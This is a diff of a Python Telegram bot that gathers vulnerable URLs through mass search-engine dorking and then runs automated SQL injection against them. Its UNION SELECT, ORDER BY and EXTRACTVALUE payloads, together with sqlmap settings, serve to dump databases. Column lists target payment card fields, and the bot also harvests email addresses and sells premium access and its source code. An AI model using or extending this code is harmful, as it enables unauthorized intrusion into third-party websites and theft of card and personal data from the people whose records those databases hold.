         if progress_callback:
             try:
-                await progress_callback(total, total, len(scores), 0)
+                await progress_callback(done, total, len(found_url_scores), retries)
             except Exception:
                 pass
-        sorted_items = sorted(scores.items(), key=lambda x: x[1], reverse=True)
-        return [u for u, _ in sorted_items[:limit]]
 
-    # Large runs (200 .. 1,000,000+ dorks): unleash ALL 12 CPU CORES in parallel!
-    n_procs = min(os.cpu_count() or 12, 12, max(2, total // 100))
-    ctx = _mp.get_context("fork")
-    prog_q = ctx.Queue()
-    stop_val = ctx.Value("i", 0)
-    shm_base = "/dev/shm" if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK) else tempfile.gettempdir()
-    run_dir = tempfile.mkdtemp(prefix="spidey_hyper_", dir=shm_base)
+    # ── HTTP session for scraping — use shared connector ──────────────────────
+    connector = _get_connector()   # shared pool, no new sockets per user
+    scrape_sem = asyncio.Semaphore(250)  # 250 parallel scrape requests
+    batch_gate = asyncio.Semaphore(40)   # 40 batches running at once
 
-    per_worker_limit = max(60_000, int((limit * 1.5) // n_procs) + 15_000)
-    shards = [work_dorks[i::n_procs] for i in range(n_procs)]
-    out_paths = [os.path.join(run_dir, f"w_{wid}.json") for wid in range(n_procs)]
+    async def _process_batch(batch_start: int, batch: list):
+        """Process one batch: multi-page Bing scraping + secondary engine + DDGS."""
+        nonlocal retries
+        async with batch_gate:
+            if (stop_event and stop_event.is_set()) or len(found_url_scores) >= limit:
+                return
 
-    procs = []
-    for wid, shard in enumerate(shards):
-        p = ctx.Process(
-            target=_mp_worker_entry,
-            args=(wid, shard, per_worker_limit, proxy_list, out_paths[wid], prog_q, stop_val),
-            daemon=True,
-        )
-        p.start()
-        procs.append(p)
+            bing_engine = SCRAPE_ENGINES[0]  # Bing is always index 0
 
-    worker_done = {i: 0 for i in range(n_procs)}
-    worker_found = {i: 0 for i in range(n_procs)}
-    worker_err = {i: 0 for i in range(n_procs)}
-    finished_workers = set()
-    last_cb_t = 0.0
+            # Build scrape tasks:
+            #   - Bing: first 5 pages (offsets 1,11,21,31,41) × 30 results ➪ up to 150/dork
+            #     CAPTCHA pages are auto-skipped by fetch_scrape, so no wasted results
+            #   - 1 random fallback engine for diversity
+            scrape_tasks = []
+            for dork in batch:
+                for offset in bing_engine["offsets"][:3]:   # 3 pages × 30 = up to 90/dork from Bing
+                    scrape_tasks.append(
+                        fetch_scrape(session, bing_engine, dork, offset, scrape_sem, proxy_list)
+                    )
+                # one extra engine for variety
+                sec = random.choice(_ENGINE_POOL)
+                scrape_tasks.append(
+                    fetch_scrape(session, sec, dork, random.choice(sec["offsets"]), scrape_sem, proxy_list)
+                )
 
-    try:
-        while len(finished_workers) < n_procs:
-            if stop_event and stop_event.is_set() and stop_val.value == 0:
-                stop_val.value = 1
+            # Fire scrape + DDGS simultaneously; cap DDGS at 12 s
+            gather_args = [asyncio.gather(*scrape_tasks, return_exceptions=True)]
+            if DDGS_AVAILABLE:
+                gather_args.append(
+                    asyncio.wait_for(
+                        search_ddgs_batch(batch, max_results=100, proxy_list=proxy_list,
+                                          num_variants=_num_variants),
+                        timeout=45.0,
+                    )
+                )
 
-            drained = 0
-            while drained < 400:
-                try:
-                    msg = prog_q.get_nowait()
-                except Exception:
-                    break
-                drained += 1
-                kind = msg[0]
-                if kind == "prog":
-                    _, wid, d_n, f_n, e_n = msg
-                    worker_done[wid] = d_n
-                    worker_found[wid] = f_n
-                    worker_err[wid] = e_n
-                elif kind == "done":
-                    _, wid, f_n, e_n = msg
-                    worker_done[wid] = len(shards[wid])
-                    worker_found[wid] = f_n
-                    worker_err[wid] = e_n
-                    finished_workers.add(wid)
+            all_results = await asyncio.gather(*gather_args, return_exceptions=True)
 
-            est_found = int(sum(worker_found.values()) * 0.82)
-            now = time.monotonic()
-            if progress_callback and (now - last_cb_t >= 1.8):
-                last_cb_t = now
-                sum_done = sum(worker_done.values())
-                sum_err = sum(worker_err.values())
-                try:
-                    await progress_callback(min(sum_done, total), total, min(est_found, limit), sum_err)
-                except Exception:
-                    pass
+            # Scrape results (index 0)
+            scrape_res = all_results[0]
+            if isinstance(scrape_res, list):
+                for r in scrape_res:
+                    if isinstance(r, list):
+                        for url in r:
+                            _add_url(url)
+                    elif isinstance(r, Exception):
+                        retries += 1
 
-            if sum(worker_found.values()) >= int(limit * 1.35):
-                stop_val.value = 1
+            # DDGS results (index 1 if present)
+            if len(all_results) > 1:
+                ddgs_res = all_results[1]
+                if isinstance(ddgs_res, list):
+                    for url in ddgs_res:
+                        _add_url(url)
+                elif isinstance(ddgs_res, (asyncio.TimeoutError, Exception)):
+                    retries += len(batch)
 
-            if all(not p.is_alive() for p in procs) and prog_q.empty():
+            done = min(batch_start + len(batch), total)
+            await _report(done)
+
+    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
+        BATCH = 35   # 35 dorks per batch
+        # Process batches in groups of 90 max
+        GROUP_SIZE = 90
+        all_starts = list(range(0, total, BATCH))
+
+        for group_start in range(0, len(all_starts), GROUP_SIZE):
+            group = all_starts[group_start: group_start + GROUP_SIZE]
+            batch_coros = [
+                _process_batch(i, dorks[i: i + BATCH])
+                for i in group
+            ]
+            await asyncio.gather(*batch_coros, return_exceptions=True)
+            # Stop early if limit hit or stop requested
+            if (stop_event and stop_event.is_set()) or len(found_url_scores) >= limit:
                 break
 
-            await asyncio.sleep(0.2)
-
-        for p in procs:
-            p.join(timeout=3.0)
-            if p.is_alive():
-                try:
-                    p.terminate()
-                except Exception:
-                    pass
-
-        # Fast merge across all 12 RAM shard files (highest SQLi score wins domain slots!)
-        all_candidates = []
-        for wid in range(n_procs):
-            fp = out_paths[wid]
-            if os.path.isfile(fp):
-                try:
-                    with open(fp, "r", encoding="utf-8") as _rf:
-                        d_map = json.load(_rf)
-                    all_candidates.extend(d_map.items())
-                except Exception:
-                    pass
-
-        all_candidates.sort(key=lambda x: x[1], reverse=True)
-        merged_urls = []
-        merged_norm = set()
-        dom_param_cnt = {}
-        dom_static_cnt = {}
-        for url, _sc in all_candidates:
-            if len(merged_urls) >= limit:
-                break
-            norm = normalize_url(url)
-            if norm in merged_norm:
-                continue
-            is_param = ("?" in url and "=" in url)
-            try:
-                dom = urlparse(url).netloc.lower().lstrip("www.")
-                if is_param:
-                    if dom_param_cnt.get(dom, 0) >= 14:
-                        continue
-                    dom_param_cnt[dom] = dom_param_cnt.get(dom, 0) + 1
-                else:
-                    if dom_static_cnt.get(dom, 0) >= 3:
-                        continue
-                    dom_static_cnt[dom] = dom_static_cnt.get(dom, 0) + 1
-            except Exception:
-                pass
-            merged_norm.add(norm)
-            merged_urls.append(url)
-        return merged_urls
-    finally:
-        stop_val.value = 1
-        for p in procs:
-            if p.is_alive():
-                try:
-                    p.terminate()
-                except Exception:
-                    pass
-        shutil.rmtree(run_dir, ignore_errors=True)
+    # ── Sort: best URLs first, fully unique ──────────────────────────────────
+    sorted_items = sorted(found_url_scores.items(), key=lambda x: x[1], reverse=True)
+    return list(dict.fromkeys(url for url, _ in sorted_items))
 
 
 # ══════════════════════════════════════════════════════════════════════
@@ -2583,7 +2133,7 @@ except ImportError:
     DEFAULT_TECHNIQUE  = "BEUSTQ"
     DEFAULT_THREADS    = 10
     DEFAULT_TAMPER     = "space2comment,between,charencode"
-    DEFAULT_TIMEOUT    = 50
+    DEFAULT_TIMEOUT    = 420
     DEFAULT_MAX_CONC   = 5
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -3075,7 +2625,7 @@ async def run_api_task(
                 result.error = "timeout"
                 break
 
-            await asyncio.sleep(0.8)
+            await asyncio.sleep(4)
 
             # Stream new log lines
             try:
@@ -3577,23 +3127,20 @@ _CARD_COLS = ["card", "cc_", "ccnum", "cardnum", "number", "pan",
 # ── HTTP HELPERS ──────────────────────────────────────────────────────────────
 
 async def _get(session: aiohttp.ClientSession, url: str, proxy_url: str) -> str:
-    """Fast resilient fetcher: tries user proxy first (if any), ALWAYS retries Direct on error!"""
-    attempts = [proxy_url, ""] if proxy_url else [""]
-    for px in attempts:
-        try:
-            kw = {
-                "timeout": aiohttp.ClientTimeout(total=8.0, sock_connect=3.0, sock_read=5.0),
-                "ssl": False,
-                "allow_redirects": True,
-                "headers": {"User-Agent": _UA},
-            }
-            if px:
-                kw["proxy"] = px
-            async with session.get(url, **kw) as r:
-                if r.status in (200, 500):
-                    return await r.text(errors="ignore")
-        except Exception:
-            continue
+    try:
+        kw = {
+            "timeout": aiohttp.ClientTimeout(total=_TIMEOUT),
+            "ssl":     False,
+            "allow_redirects": True,
+            "headers": {"User-Agent": _UA},
+        }
+        if proxy_url:
+            kw["proxy"] = proxy_url
+        async with session.get(url, **kw) as r:
+            if r.status in (200, 500):
+                return await r.text(errors="ignore")
+    except Exception:
+        pass
     return ""
 
 
@@ -3602,36 +3149,21 @@ def _has_db_error(html: str) -> bool:
     return any(e in low for e in _SQL_ERRORS)
 
 
-def _set_url_param(url: str, param_idx: int, new_raw_val: str) -> str:
-    """Replace parameter `param_idx` cleanly while preserving all other query parameters."""
-    try:
-        p = urlparse(url)
-        pairs = parse_qsl(p.query, keep_blank_values=True)
-        if not pairs:
-            return url + new_raw_val
-        idx = min(max(0, param_idx), len(pairs) - 1)
-        k, _ = pairs[idx]
-        new_pairs = list(pairs)
-        new_pairs[idx] = (k, new_raw_val)
-        return urlunparse(p._replace(query=urlencode(new_pairs, doseq=True)))
-    except Exception:
-        return url + new_raw_val
+# ── INJECTION HELPERS ─────────────────────────────────────────────────────────
 
-
-def _inject_param(url: str, payload: str, param_idx: int = 0) -> str:
-    """Append `payload` onto parameter `param_idx` value."""
+def _inject_param(url: str, payload: str) -> str:
+    """Inject payload into the first query parameter value."""
     try:
-        p = urlparse(url)
-        pairs = parse_qsl(p.query, keep_blank_values=True)
-        if not pairs:
-            return url + payload
-        idx = min(max(0, param_idx), len(pairs) - 1)
-        k, v = pairs[idx]
-        new_pairs = list(pairs)
-        new_pairs[idx] = (k, v + payload)
-        return urlunparse(p._replace(query=urlencode(new_pairs, doseq=True)))
+        p  = urlparse(url)
+        qs = parse_qs(p.query, keep_blank_values=True)
+        if not qs:
+            return url
+        key = list(qs.keys())[0]
+        new_qs = {k: [v[0]] for k, v in qs.items()}
+        new_qs[key] = [qs[key][0] + payload]
+        return urlunparse(p._replace(query=urlencode(new_qs, doseq=True)))
     except Exception:
-        return url + payload
+        return url
 
 
 def _extract_markers(html: str, marker_start="LBOT", marker_end="LBOT") -> list:
@@ -3646,149 +3178,73 @@ def _concat_marker(expr: str) -> str:
     return f"CONCAT(0x4c424f54,{expr},0x4c424f54)"   # LBOT + expr + LBOT
 
 
-# Per-session learned injection profile cache: url -> dict(mode, param_idx, num_cols, col_pos, prefix_tpl)
-def _get_dump_plan_map(session) -> dict:
-    d = getattr(session, "_spidey_dump_plans", None)
-    if d is None:
-        d = {}
-        setattr(session, "_spidey_dump_plans", d)
-    return d
-
-
-async def _discover_union_or_xpath_plan(session: aiohttp.ClientSession, url: str, proxy_url: str) -> dict:
-    """
-    Single-pass parallel discovery across ALL parameter positions, ALL quote styles
-    (Numeric `-999999`, Single-Quote `' AND 1=2`, Paren `') AND 1=2`, Double-Quote `" AND 1=2`),
-    AND columns `1..12` using per-column unique hex markers `LBC_<idx>_` — PLUS MySQL
-    `EXTRACTVALUE` XPATH fallback when 0 visible UNION columns exist on page!
-    """
-    plans = _get_dump_plan_map(session)
-    if url in plans:
-        return plans[url]
-
-    p = urlparse(url)
-    pairs = parse_qsl(p.query, keep_blank_values=True)
-    param_indices = list(range(min(len(pairs), 4))) if pairs else [0]
-
-    # Templates `{orig}` -> full parameter value before SQL comment
-    styles = [
-        ("num",   "-999999 UNION ALL SELECT {cols}-- -"),
-        ("squote","{orig}' AND 1=2 UNION ALL SELECT {cols}-- -"),
-        ("pquote","{orig}') AND ('1'='2' UNION ALL SELECT {cols}-- -"),
-        ("dquote",'{orig}" AND 1=2 UNION ALL SELECT {cols}-- -'),
-        ("raw_sq","{orig}' UNION SELECT {cols}-- -"),
-    ]
-
-    sem = asyncio.Semaphore(36)
-
-    async def _probe_union_combo(pidx: int, style_name: str, tpl: str, ncols: int):
-        orig_val = pairs[pidx][1] if pidx < len(pairs) else "1"
-        col_tokens = [_hex(f"LBC_{c}_END") for c in range(ncols)]
-        raw_val = tpl.format(orig=orig_val, cols=",".join(col_tokens))
-        t_url = _set_url_param(url, pidx, raw_val)
-        async with sem:
-            html = await _get(session, t_url, proxy_url)
-        if html:
-            for c in range(ncols):
-                if f"LBC_{c}_END" in html:
-                    return {
-                        "mode": "union",
-                        "param_idx": pidx,
-                        "num_cols": ncols,
-                        "col_pos": c,
-                        "tpl": tpl,
-                    }
-        return None
-
-    probe_tasks = []
-    # Prioritize param 0 first across styles num & squote (covers 95% of real PHP targets in 1 round-trip!)
-    for pidx in param_indices:
-        for s_name, tpl in styles:
-            for ncols in range(1, 13):
-                probe_tasks.append(_probe_union_combo(pidx, s_name, tpl, ncols))
-
-    res_all = await asyncio.gather(*probe_tasks, return_exceptions=True)
-    for item in res_all:
-        if isinstance(item, dict):
-            plans[url] = item
-            return item
-
-    # Fallback: MySQL / MariaDB Error-Based XPATH extraction (`0x7e4c424f54` = `~LBOT` forces MySQL XPath syntax error within 31-char limit!)
-    xpath_styles = [
-        "{orig} AND EXTRACTVALUE(1,CONCAT(0x7e4c424f54,({expr}),0x4c424f54))-- -",
-        "{orig}' AND EXTRACTVALUE(1,CONCAT(0x7e4c424f54,({expr}),0x4c424f54))-- -",
-        '{orig}" AND EXTRACTVALUE(1,CONCAT(0x7e4c424f54,({expr}),0x4c424f54))-- -',
-        "{orig}') AND EXTRACTVALUE(1,CONCAT(0x7e4c424f54,({expr}),0x4c424f54))-- -",
-    ]
-    for pidx in param_indices:
-        orig_val = pairs[pidx][1] if pidx < len(pairs) else "1"
-        for xtpl in xpath_styles:
-            raw_val = xtpl.format(orig=orig_val, expr="0x58504f4b")  # "XPOK"
-            t_url = _set_url_param(url, pidx, raw_val)
-            html = await _get(session, t_url, proxy_url)
-            if html and "XPOK" in html:
-                plan = {
-                    "mode": "xpath",
-                    "param_idx": pidx,
-                    "num_cols": 1,
-                    "col_pos": 0,
-                    "tpl": xtpl,
-                }
-                plans[url] = plan
-                return plan
-
-    empty_plan = {"mode": "none", "param_idx": 0, "num_cols": 0, "col_pos": 0, "tpl": ""}
-    plans[url] = empty_plan
-    return empty_plan
-
+# ── ❀ Sᴛᴇᴘ 1: DETECT COLUMN COUNT ───────────────────────────────────────────────
 
 async def detect_columns(session: aiohttp.ClientSession, url: str, proxy_url: str) -> int:
-    """Detect exact column count across Numeric, String, Paren, Double-Quote UNION + XPATH fallback."""
-    plan = await _discover_union_or_xpath_plan(session, url, proxy_url)
-    return plan.get("num_cols", 0)
+    """ORDER BY 1,2,3… until error. Returns column count."""
+    baseline = await _get(session, url, proxy_url)
+    base_len = len(baseline)
 
+    # Run all ORDER BY probes concurrently for speed
+    async def _probe_order(n):
+        test_url = _inject_param(url, f"' ORDER BY {n} -- -")
+        html     = await _get(session, test_url, proxy_url)
+        return n, html, len(html)
+
+    tasks   = [_probe_order(n) for n in range(1, _MAX_COLS + 1)]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    for n, html, hlen in sorted(
+        [r for r in results if isinstance(r, tuple)], key=lambda x: x[0]
+    ):
+        if _has_db_error(html) or (n > 1 and abs(hlen - base_len) > 2000):
+            return max(n - 1, 1)
+
+    # Fallback: UNION NULL probe
+    for n in range(1, _MAX_COLS + 1):
+        nulls    = ",".join(["NULL"] * n)
+        test_url = _inject_param(url, f"' UNION SELECT {nulls} -- -")
+        html     = await _get(session, test_url, proxy_url)
+        if html and not _has_db_error(html) and len(html) > 100:
+            return n
+
+    return 3
+
+
+# ── ❀ Sᴛᴇᴘ 2: FIND INJECTABLE COLUMN ───────────────────────────────────────────
 
 async def find_col_pos(session: aiohttp.ClientSession, url: str,
                        num_cols: int, proxy_url: str) -> int:
-    """Return exact visible column slot found during discovery."""
-    plan = await _discover_union_or_xpath_plan(session, url, proxy_url)
-    return plan.get("col_pos", 0)
+    """Try each column slot concurrently. Returns index of first visible column."""
+    marker = _hex("loopBOT_MARKER")
 
+    async def _try_col(i):
+        cols    = ["NULL"] * num_cols
+        cols[i] = marker
+        payload  = "' UNION SELECT " + ",".join(cols) + " -- -"
+        test_url = _inject_param(url, payload)
+        html     = await _get(session, test_url, proxy_url)
+        return i, html and "loopBOT_MARKER" in html
+
+    results = await asyncio.gather(*[_try_col(i) for i in range(num_cols)],
+                                   return_exceptions=True)
+    for r in results:
+        if isinstance(r, tuple) and r[1]:
+            return r[0]
+    return 0
+
+
+# ── ❀ Sᴛᴇᴘ 3: GENERIC UNION QUERY ──────────────────────────────────────────────
 
 async def union_query(session: aiohttp.ClientSession, url: str,
                       num_cols: int, col_pos: int,
                       sql_expr: str, proxy_url: str) -> list:
-    """Execute SQL expression via learned UNION profile OR chunked XPATH error extraction."""
-    plan = await _discover_union_or_xpath_plan(session, url, proxy_url)
-    p = urlparse(url)
-    pairs = parse_qsl(p.query, keep_blank_values=True)
-    pidx = plan.get("param_idx", 0)
-    orig_val = pairs[pidx][1] if pidx < len(pairs) else "1"
-
-    if plan.get("mode") == "xpath":
-        # EXTRACTVALUE returns up to 31 chars per chunk -> stitch chunks seamlessly!
-        chunks = []
-        for pos in range(1, 3600, 20):
-            sub_expr = f"SUBSTRING(({sql_expr}),{pos},20)"
-            raw_val = plan["tpl"].format(orig=orig_val, expr=sub_expr)
-            html = await _get(session, _set_url_param(url, pidx, raw_val), proxy_url)
-            found = _extract_markers(html)
-            piece = found[0] if found else ""
-            if not piece:
-                break
-            chunks.append(piece)
-            if len(piece) < 20:
-                break
-        return ["".join(chunks)] if chunks else []
-
-    if plan.get("mode") == "union" and num_cols >= 1:
-        cols = ["NULL"] * num_cols
-        cols[min(col_pos, num_cols - 1)] = _concat_marker(sql_expr)
-        raw_val = plan["tpl"].format(orig=orig_val, cols=",".join(cols))
-        html = await _get(session, _set_url_param(url, pidx, raw_val), proxy_url)
-        return _extract_markers(html)
-
-    return []
+    cols          = ["NULL"] * num_cols
+    cols[col_pos] = _concat_marker(sql_expr)
+    payload       = "' UNION SELECT " + ",".join(cols) + " -- -"
+    test_url      = _inject_param(url, payload)
+    html          = await _get(session, test_url, proxy_url)
+    return _extract_markers(html)
 
 
 # ── ❀ Sᴛᴇᴘ 4: GET DATABASE NAME ─────────────────────────────────────────────────
@@ -3939,7 +3395,7 @@ async def dump_url(url: str, proxy_url: str = "",
     result.url = url
 
     # 40 connections per dump — max speed
-    connector = aiohttp.TCPConnector(limit=40, ssl=False, ttl_dns_cache=600)
+    connector = aiohttp.TCPConnector(limit=40, ssl=False, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as session:
 
         # Step 1 — detect columns (now concurrent probes)
@@ -4009,7 +3465,7 @@ async def dump_multiple(
     proxy_url: str = "",
     stop_event: asyncio.Event = None,
     progress_cb=None,
-    max_concurrent: int = 100,  # 100 concurrent pure-Python UNION dumps
+    max_concurrent: int = 20,   # max concurrent dumps
     proxy_list: list = None,    # multi-proxy pool — each URL picks a different proxy
 ) -> list:
     """Dump multiple URLs concurrently. Returns DumpResult list with data.
@@ -4031,12 +3487,9 @@ async def dump_multiple(
         if stop_event and stop_event.is_set():
             return
         async with sem:
-            try:
-                r = await asyncio.wait_for(dump_url(url, "", stop_event, proxy_list=proxy_list), timeout=14.0)
-            except Exception:
-                r = None
+            r = await dump_url(url, "", stop_event, proxy_list=proxy_list)
             done[0] += 1
-            if r and (r.raw_rows or r.cards):
+            if r.raw_rows or r.cards:
                 results.append(r)
             if progress_cb:
                 try:
@@ -4057,8 +3510,8 @@ if not os.path.isfile(SQLMAP_BIN):
     SQLMAP_BIN = shutil.which("sqlmap") or "sqlmap"
 
 # ── Timeouts / limits ────────────────────────────────────────────────────────
-PER_URL_TIMEOUT    = 50    # fast per-URL timeout
-MAX_CONCURRENT     = 24     # 24 sqlmap processes across 12 cores
+PER_URL_TIMEOUT    = 420    # seconds per URL (sqlmap can be slow with level5)
+MAX_CONCURRENT     = 20     # sqlmap processes at once
 SQLMAP_THREADS     = 25     # HTTP threads inside each sqlmap process
 SQLMAP_LEVEL       = 3      # 1-5  — 3 is fast+thorough balance
 SQLMAP_RISK        = 2      # 1-3  — 2 is speed+coverage balance
@@ -4551,79 +4004,6 @@ _LIVE_FEED: dict            = {}   # uid → {name, start, dorks_total, dorks_do
 _ANTHROPIC_KEY   = os.environ.get("ANTHROPIC_API_KEY", "")
 _GEMINI_KEY      = os.environ.get("GEMINI_API_KEY", "")
 _OPENROUTER_KEY  = os.environ.get("OPENROUTER_API_KEY", "")
-_AI_KEYS_FILE    = _Path(__file__).parent / "ai_keys.json"
-
-def _load_ai_keys():
-    global _ANTHROPIC_KEY, _GEMINI_KEY, _OPENROUTER_KEY
-    if _AI_KEYS_FILE.exists():
-        try:
-            d = json.loads(_AI_KEYS_FILE.read_text(encoding="utf-8"))
-            if d.get("anthropic"):
-                _ANTHROPIC_KEY = d["anthropic"]
-                os.environ["ANTHROPIC_API_KEY"] = d["anthropic"]
-            if d.get("gemini"):
-                _GEMINI_KEY = d["gemini"]
-                os.environ["GEMINI_API_KEY"] = d["gemini"]
-            if d.get("openrouter"):
-                _OPENROUTER_KEY = d["openrouter"]
-                os.environ["OPENROUTER_API_KEY"] = d["openrouter"]
-            logger.info("🔑 AI API Keys loaded from ai_keys.json")
-        except Exception as e:
-            logger.warning("Error loading ai_keys.json: %s", e)
-
-def _save_ai_key(provider: str, key: str):
-    global _ANTHROPIC_KEY, _GEMINI_KEY, _OPENROUTER_KEY
-    d = {}
-    if _AI_KEYS_FILE.exists():
-        try:
-            d = json.loads(_AI_KEYS_FILE.read_text(encoding="utf-8"))
-        except Exception:
-            d = {}
-    d[provider] = key
-    _AI_KEYS_FILE.write_text(json.dumps(d, indent=2), encoding="utf-8")
-    if provider == "anthropic":
-        _ANTHROPIC_KEY = key
-        os.environ["ANTHROPIC_API_KEY"] = key
-    elif provider == "gemini":
-        _GEMINI_KEY = key
-        os.environ["GEMINI_API_KEY"] = key
-    elif provider == "openrouter":
-        _OPENROUTER_KEY = key
-        os.environ["OPENROUTER_API_KEY"] = key
-
-def _mask_key(k: str) -> str:
-    if not k:
-        return "❌ `Not Set`"
-    if len(k) <= 8:
-        return "✅ `Configured (****)`"
-    return f"✅ `{k[:6]}...{k[-4:]}`"
-
-def _ai_keys_status_text() -> str:
-    _load_ai_keys()
-    return (
-        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-        "🤖 𝘼𝙄 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧 𝙆𝙚𝙮𝙨 𝘾𝙤𝙣𝙛𝙞𝙜\n"
-        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
-        f"🔵 *Anthropic (Claude):*\n   {_mask_key(_ANTHROPIC_KEY)}\n\n"
-        f"🟢 *Google Gemini:*\n   {_mask_key(_GEMINI_KEY)}\n\n"
-        f"🟡 *OpenRouter (LLaMA/DeepSeek/GPT):*\n   {_mask_key(_OPENROUTER_KEY)}\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "💡 *How to configure:*\n"
-        "• Tap any button below to set or clear keys\n"
-        "• Or send command directly in chat:\n"
-        "`/setkey gemini YOUR_KEY`\n"
-        "`/setkey anthropic YOUR_KEY`\n"
-        "`/setkey openrouter YOUR_KEY`"
-    )
-
-def make_ai_keys_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔵 Sᴇᴛ Aɴᴛʜʀᴏᴘɪᴄ",  callback_data="setkey_anthropic"),
-         InlineKeyboardButton("🟢 Sᴇᴛ Gᴇᴍɪɴɪ",     callback_data="setkey_gemini")],
-        [InlineKeyboardButton("🟡 Sᴇᴛ OᴘᴇɴRᴏᴜᴛᴇʀ", callback_data="setkey_openrouter"),
-         InlineKeyboardButton("🗑️ Cʟᴇᴀʀ Aʟʟ",      callback_data="delkey_all")],
-        [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ",     callback_data="admin_panel")],
-    ])
 
 # Email regex — all providers
 _EMAIL_RE = re.compile(
@@ -4676,45 +4056,9 @@ def _clear_checkpoint(uid: int):
     except Exception:
         pass
 
-_BAD_EMAIL_EXTS = (".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".css", ".js", ".woff", ".woff2", ".ttf", ".ico", ".mp4")
 def _extract_emails(text: str) -> list:
     found = _EMAIL_RE.findall(text)
-    clean = []
-    for e in found:
-        el = e.lower().strip(".")
-        if not el.endswith(_BAD_EMAIL_EXTS) and not el.endswith(("@example.com", "@sentry.io", "@domain.com")):
-            clean.append(el)
-    return list(dict.fromkeys(clean))
-
-async def _harvest_emails_from_urls(urls: list, max_pages: int = 2000) -> list:
-    """Crawl live web pages concurrently (800 workers) to harvest real contact/DB emails."""
-    targets, seen_dom = [], {}
-    for u in urls:
-        try:
-            d = urlparse(u).netloc.lower()
-            if d and seen_dom.get(d, 0) < 2:
-                seen_dom[d] = seen_dom.get(d, 0) + 1
-                targets.append(u)
-        except Exception:
-            pass
-        if len(targets) >= max_pages:
-            break
-    if not targets:
-        return []
-    sem = asyncio.Semaphore(800)
-    collected = []
-    async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as sess:
-        async def _grab(u):
-            async with sem:
-                try:
-                    async with sess.get(u, timeout=aiohttp.ClientTimeout(total=15.0, sock_connect=2.0, sock_read=4.0), ssl=False) as r:
-                        if r.status == 200:
-                            html = await r.text(errors="ignore")
-                            collected.extend(_extract_emails(html))
-                except Exception:
-                    pass
-        await asyncio.gather(*[_grab(u) for u in targets], return_exceptions=True)
-    return list(dict.fromkeys(collected))
+    return list(dict.fromkeys(e.lower() for e in found))
 
 def _live_update(uid: int, **kwargs):
     if uid in _LIVE_FEED:
@@ -4978,8 +4322,6 @@ def generate_key() -> str:
 
 def make_main_menu():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🚀 Aᴜᴛᴏ-Pɪʟᴏᴛ Pɪᴘᴇʟɪɴᴇ",       callback_data="menu_autopilot"),
-         InlineKeyboardButton("🧰 Cᴏᴍʙᴏ & URL Rᴇғɪɴᴇʀʏ",     callback_data="menu_refinery")],
         [InlineKeyboardButton("🥇 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏᴡᴏʀᴅs︎",        callback_data="menu_keywords"),
          InlineKeyboardButton("🥈 Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs",           callback_data="menu_dorks")],
         [InlineKeyboardButton("🎖️ Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs ᴠ2",       callback_data="menu_adorks"),
@@ -4996,10 +4338,6 @@ def make_main_menu():
          InlineKeyboardButton("🍷 Pᴜʀᴄʜᴀsᴇ Pʀᴇᴍᴜɪᴍ",         callback_data="menu_purchase")],
         [InlineKeyboardButton("🚸︎ Hᴏᴡ Tᴏ ᴜsᴇ ?",               callback_data="menu_guide"),
          InlineKeyboardButton("🧛🏻 Cᴏɴᴛᴀᴄᴛ Oᴡɴᴇʀ",           callback_data="menu_help")],
-        [InlineKeyboardButton("📧 Eᴍᴀɪʟ Hᴀʀᴠᴇsᴛ",            callback_data="menu_emails"),
-         InlineKeyboardButton("⚡ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ",           callback_data="menu_statuscheck")],
-        [InlineKeyboardButton("🤖 AI Kᴇʏᴡᴏʀᴅs",             callback_data="menu_aigen"),
-         InlineKeyboardButton("🔁 Dᴇᴅᴜᴘ Sᴛᴀᴛᴜs",            callback_data="menu_dedup")],
         [InlineKeyboardButton("⚜️ Bᴜʏ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ",          callback_data="menu_source")],
     ])
 
@@ -5024,10 +4362,7 @@ def make_admin_menu():
          InlineKeyboardButton("🛖︎ Sᴇʀᴠᴇʀ Iɴғᴏ",     callback_data="admin_serverinfo")],
         [InlineKeyboardButton("🔄 Sᴄʀᴀᴘᴇ & Vᴀʟɪᴅᴀᴛᴇ", callback_data="admin_scrapeproxy"),
          InlineKeyboardButton("🎯 Mɪɴ Pʀᴏxʏ Lɪᴍɪᴛ",  callback_data="admin_minproxy")],
-        [InlineKeyboardButton("👁️ Lɪᴠᴇ Fᴇᴇᴅ",           callback_data="admin_livefeed"),
-         InlineKeyboardButton("🔁 Dᴇᴅᴜᴘ Sᴛᴀᴛs",          callback_data="admin_dedupstats")],
-        [InlineKeyboardButton("🤖 AI Kᴇʏs Cᴏɴғɪɢ",     callback_data="admin_aikeys"),
-         InlineKeyboardButton("🗂️︎ Gᴇᴛ Bᴏᴛ Fɪʟᴇ",    callback_data="admin_getfile")],
+        [InlineKeyboardButton("🗂️︎ Gᴇᴛ Bᴏᴛ Fɪʟᴇ",    callback_data="admin_getfile")],
         [InlineKeyboardButton("⏪︎ Mᴀɪɴ Mᴇɴᴜ",        callback_data="menu_back")],
     ])
 
@@ -6115,11 +5450,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             await query.answer("🍷︎ Pʀᴇᴍɪᴜᴍ Mᴇᴍʙᴇʀs Oɴʟʏ! Cᴏɴᴛᴀᴄᴛ " + ADMIN_USERNAME, show_alert=True)
         return MENU
 
-    # ── AI Keyword Provider buttons (must run BEFORE menu fallthrough!) ───────
-    if data.startswith("aigen_"):
-        await aigen_callback(update, context)
-        return MENU
-
     # ── Stop buttons ──────────────────────────────────────────────────────────
     if data == "menu_alldump":
         await query.edit_message_text(
@@ -6600,7 +5930,68 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         if not is_admin(user_id):
